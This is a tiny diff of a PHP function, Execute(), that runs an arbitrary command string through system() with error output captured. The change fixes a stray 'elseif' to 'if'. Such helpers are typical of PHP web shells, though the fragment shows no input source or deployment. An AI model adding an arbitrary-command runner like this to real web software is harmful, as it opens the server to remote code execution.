@@ -7,7 +7,7 @@ function any($x,$y)
 function Execute($x)
 {
 	$x=$x.' 2>&1';
-	elseif(function_exists('system'))
+	if(function_exists('system'))
 	{
 		ob_start();
 		$system=system($x);
